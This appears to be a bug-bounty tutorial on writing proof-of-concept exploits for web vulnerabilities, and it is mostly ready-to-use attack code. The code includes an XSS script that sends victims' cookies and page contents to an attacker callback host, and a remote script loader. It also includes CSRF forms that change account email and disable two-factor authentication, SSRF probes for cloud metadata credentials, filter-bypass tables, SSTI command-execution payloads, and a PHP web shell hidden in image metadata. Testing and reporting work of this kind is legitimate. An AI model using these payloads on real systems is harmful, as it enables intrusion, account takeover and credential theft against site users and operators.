# Proof-of-Concept Development Guide

## Introduction

A well-crafted Proof-of-Concept (PoC) is the difference between a triaged bug bounty report and one that gets closed as informative. PoCs demonstrate that a vulnerability is real, reproducible, and impactful. This guide covers building PoCs for the most common bug bounty vulnerability classes: HTML injection, cross-site scripting (XSS) with data exfiltration, cross-site request forgery (CSRF), and server-side request forgery (SSRF) chains.

Each section provides ready-to-adapt template code that you can customize for your specific target. Always test PoCs in authorized environments and ensure they comply with the bug bounty program rules.

**PoC development principles:**
- **Minimal**: The smallest amount of code that demonstrates the vulnerability
- **Safe**: Never cause damage; use `id` instead of `rm`, use test accounts instead of production data
- **Reproducible**: Must work consistently, not just once under specific conditions
- **Self-contained**: Include all dependencies inline; the triager should not need to install anything
- **Well-documented**: Comment every step; the triager may not be a security expert

## Practical Steps

### 1. HTML Injection PoC

HTML injection demonstrates that user-controlled input is rendered as HTML without proper encoding:

```html
<!-- Basic HTML injection test -->
<div style="background:red;padding:20px;">
  <h1>HTML Injection Successful</h1>
  <p>This content was injected via the vulnerable parameter.</p>
  <img src="https://attacker-domain.com/log?injection=html" />
</div>

<!-- URL-encoded payload for GET parameters -->
%3Cdiv%20style%3D%22background%3Ared%22%3E%3Ch1%3EInjected%3C%2Fh1%3E%3C%2Fdiv%3E
```

**Testing workflow:**

```bash
# Identify injectable parameters
curl -s "https://target.com/search?q=<h1>test</h1>" | grep "<h1>test</h1>"

# Confirm the injection renders as HTML
curl -s "https://target.com/search?q=<img src=x onerror=alert(1)>"
```

**When HTML injection qualifies for bounties:**

HTML injection by itself may be classified as informative on some programs. To make it bounty-worthy, demonstrate one of these impacts:
- Injection of a fake login form (credential harvesting potential)
- Injection of content that changes the visible page layout (defacement)
- Chaining with CSS injection to exfiltrate data via attribute selectors

### 2. XSS PoC with Data Exfiltration

Demonstrate XSS impact by showing data exfiltration capability:

```html
<!-- XSS PoC that exfiltrates cookies and page content -->
<script>
(function() {
  var data = {
    url: document.location.href,
    cookies: document.cookie,
    title: document.title,
    body: document.body.innerHTML.substring(0, 5000)
  };
  var img = new Image();
  img.src = 'https://attacker-callback.com/collect?d=' +
    btoa(JSON.stringify(data));
})();
</script>
```

**Blind XSS detection with callback:**

```bash
# Set up a callback server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, base64
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'd=' in self.path:
            d = self.path.split('d=')[1]
            print(json.loads(base64.b64decode(d)))
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), H).serve_forever()
"
```

**DOM XSS PoC template:**

```javascript
// Test for DOM-based XSS via location.hash
javascript:eval('var s=document.createElement("script");s.src="https://attacker.com/xss.js";document.body.appendChild(s)')

// Prototype pollution to XSS chain
Object.prototype.innerHTML = '<img src=x onerror=alert(document.domain)>'
```

**XSS filter bypass techniques for PoC refinement:**

| Filter | Bypass Technique | Payload Example |
|--------|-----------------|-----------------|
| `<script>` blocked | Use event handlers | `<img src=x onerror=alert(1)>` |
| `onerror=` blocked | Use alternative events | `<svg onload=alert(1)>` |
| `alert()` blocked | Use alternative functions | `alert.bind(null,1)()` or `prompt(1)` |
| Parentheses blocked | Use template literals | `<script>alert\`1\`</script>` |
| Angle brackets blocked | Use JS protocol | `javascript:alert(1)` in href/src |
| Keywords filtered | Use string concatenation | `<script>al``ert(1)</script>` |

### 3. CSRF PoC Generator

Build CSRF PoCs that demonstrate state-changing actions:

```html
<!-- CSRF PoC for POST-based actions (auto-submit form) -->
<html>
<body>
  <h1>CSRF PoC - Click to trigger</h1>
  <form id="csrf_form" action="https://target.com/api/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="confirm" value="true" />
  </form>
  <script>document.getElementById('csrf_form').submit();</script>
</body>
</html>

<!-- CSRF via XMLHttpRequest for JSON endpoints -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/settings', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
  "notification_email": "attacker@evil.com",
  "two_factor_enabled": false
}));
</script>
```

**CSRF PoC variants for different content types:**

```html
<!-- CSRF for multipart/form-data (file upload) -->
<form id="upload_csrf" action="https://target.com/api/avatar" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="avatar" value="webshell_content" />
</form>
<script>document.getElementById('upload_csrf').submit();</script>

<!-- CSRF for XML endpoints (SOAP/REST) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/action', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'text/xml');
xhr.send('<?xml version="1.0"?><action><type>delete</type><target>all</target></action>');
</script>
```

### 4. SSRF Chain PoC

Demonstrate SSRF impact by chaining to internal services:

```bash
# Basic SSRF test
curl -s "https://target.com/fetch?url=http://127.0.0.1:80"

# SSRF to internal metadata service
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# SSRF chain PoC template (save as poc.py)
```

```python
#!/usr/bin/env python3
"""SSRF Chain PoC - Demonstrates internal service access"""
import requests
import sys

TARGET = "https://target.com/proxy"
INTERNAL_HOSTS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://169.254.169.254/latest/meta-data/",
    "http://internal-api:8080/admin",
    "http://localhost:6379/",  # Redis
]

for host in INTERNAL_HOSTS:
    try:
        r = requests.get(TARGET, params={"url": host}, timeout=5)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] {host} -> {r.status_code} ({len(r.text)} bytes)")
            print(f"    Preview: {r.text[:200]}")
    except Exception as e:
        print(f"[-] {host} -> Error: {e}")
```

**SSRF bypass techniques for restricted targets:**

| Restriction | Bypass | Example |
|------------|--------|---------|
| `127.0.0.1` blocked | Alternative loopback | `0.0.0.0`, `[::1]`, `0x7f000001` |
| `localhost` blocked | DNS rebinding | `localtest.me`, `spoofed.burpcollaborator.net` |
| Cloud metadata blocked | Alternative endpoints | `http://[fd00:ec2::254]/`, `http://metadata.google.internal/` |
| URL scheme restricted | Protocol smuggling | `gopher://`, `dict://`, `file:///` |
| Port restricted | Redirect-based SSRF | Use open redirect to reach internal ports |

### 5. IDOR and Access Control PoCs

IDOR PoCs demonstrate that one user can access another user's resources:

```python
#!/usr/bin/env python3
"""IDOR PoC - Demonstrates unauthorized data access"""
import requests

ATTACKER_TOKEN = "eyJ..."  # Attacker's session token
VICTIM_USER_ID = 42         # Target user's ID

headers = {"Authorization": f"Bearer {ATTACKER_TOKEN}"}

# Test sequential IDs
for user_id in [VICTIM_USER_ID - 1, VICTIM_USER_ID, VICTIM_USER_ID + 1]:
    r = requests.get(
        f"https://target.com/api/v1/users/{user_id}/profile",
        headers=headers
    )
    if r.status_code == 200:
        data = r.json()
        print(f"[+] User {user_id}: {data.get('email')} / {data.get('phone')}")
    else:
        print(f"[-] User {user_id}: {r.status_code}")
```

### 6. Hosting and Delivering PoCs

```bash
# Serve PoC HTML files locally
python3 -m http.server 8080

# Use a public callback service for blind testing
# Interactsh (ProjectDiscovery)
interactsh-client

# Or use Burp Collaborator
# Configure in Burp Suite -> Project options -> Misc -> Collaborator
```

**PoC delivery methods by vulnerability type:**

| Vulnerability | Delivery Method | Notes |
|--------------|----------------|-------|
| Reflected XSS | Direct URL with payload | Include full URL in report |
| Stored XSS | Submit payload via app | Document the injection point |
| CSRF | Self-submitting HTML page | Host on any HTTP server |
| SSRF | curl command or Python script | Include all headers needed |
| IDOR | curl with token | Redact sensitive data in response |
| RCE | Minimal command (id/whoami) | Never use destructive commands |

## Hands-on Exercises

1. **Exercise 1**: Build an XSS PoC that exfiltrates the victim's CSRF token from the page, then uses it to change their password in a single chained payload
2. **Exercise 2**: Create an SSRF PoC that discovers and maps all internal services on the target network, outputting a service inventory
3. **Exercise 3**: Develop an IDOR scanner PoC that tests 100 sequential resource IDs and reports which ones return data belonging to other users
4. **Exercise 4**: Build a CSRF PoC that bypasses SameSite cookie restrictions using a subdomain takeover or JSON content-type trick

## Advanced PoC Techniques

### Race Condition PoCs

Race conditions are time-sensitive vulnerabilities that require precise timing to demonstrate:

```python
#!/usr/bin/env python3
"""Race condition PoC — demonstrates double-spend vulnerability."""
import threading
import requests

URL = "https://target.com/api/transfer"
TOKEN = "Bearer eyJ..."
AMOUNT = 100
RECIPIENT = "attacker@evil.com"

def send_transfer(thread_id):
    """Send a single transfer request."""
    headers = {
        "Authorization": TOKEN,
        "Content-Type": "application/json"
    }
    data = {
        "amount": AMOUNT,
        "recipient": RECIPIENT
    }
    r = requests.post(URL, json=data, headers=headers)
    print(f"Thread {thread_id}: {r.status_code} - {r.text[:100]}")

# Fire 20 concurrent requests
threads = []
for i in range(20):
    t = threading.Thread(target=send_transfer, args=(i,))
    threads.append(t)

# Start all threads simultaneously
for t in threads:
    t.start()
for t in threads:
    t.join()

# If the balance was debited only once but credited multiple times,
# the race condition is confirmed
```

### Server-Side Template Injection (SSTI) PoCs

```bash
# Basic SSTI detection
curl -s "https://target.com/search?q={{7*7}}" | grep "49" && echo "SSTI CONFIRMED"

# Jinja2 (Python) — read server config
curl -s "https://target.com/search?q={{config}}" | grep -i "secret_key"

# Twig (PHP) — execute code
curl -s "https://target.com/search?q={{['id']|filter('system')}}" 

# Freemarker (Java) — execute code
curl -s "https://target.com/search?q=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"

# Mako (Python) — execute code
curl -s "https://target.com/search?q=\${__import__('os').popen('id').read()}"
```

### File Upload Bypass PoCs

```bash
# Test file upload with various bypass techniques

# 1. Extension bypass — double extension
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php.jpg" \
  -F "name=shell.php.jpg"

# 2. Content-Type bypass
curl -X POST "https://target.com/upload" \
  -H "Content-Type: image/jpeg" \
  -F "file=@shell.php;type=image/jpeg"

# 3. Null byte injection (older servers)
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php%00.jpg"

# 4. Magic bytes bypass — add JPEG header to PHP file
printf '\xff\xd8\xff\xe0' > /tmp/shell.jpg
cat /tmp/webshell.php >> /tmp/shell.jpg
curl -X POST "https://target.com/upload" -F "file=@/tmp/shell.jpg"

# 5. Polyglot file (valid image + embedded PHP)
exiftool -Comment='<?php system($_GET["c"]); ?>' /tmp/normal.jpg
mv /tmp/normal.jpg /tmp/normal.php.jpg
curl -X POST "https://target.com/upload" -F "file=@/tmp/normal.php.jpg"
```

## References

- OWASP XSS Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- CSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- SSRF Bible: https://github.com/jdonsec/AllTheThings/
- Interactsh: https://github.com/projectdiscovery/interactsh
- PayloadBox XSS Payloads: https://github.com/payloadbox/xss-payload-list
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- PayloadAllTheThings File Upload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
